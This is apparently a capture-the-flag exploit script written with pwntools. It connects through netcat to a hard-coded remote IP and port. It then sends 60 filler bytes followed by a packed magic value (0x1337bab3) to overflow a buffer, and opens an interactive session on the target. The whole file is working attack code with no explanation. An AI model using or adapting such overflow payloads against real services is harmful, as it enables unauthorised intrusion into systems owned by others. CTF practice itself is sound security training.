from pwn import *
import os

os.system('clear')
context.log_level = 'debug'
#sh = remote('68.183.47.198',31162) #68.183.47.198:31162
sh = process("nc")
sh.sendline("68.183.47.198 31162")
p = b'A' * 60
p += p64(322419379) # 0x1337bab3
#sh.recvuntil("? ")
sh.sendline(p)
sh.interactive()
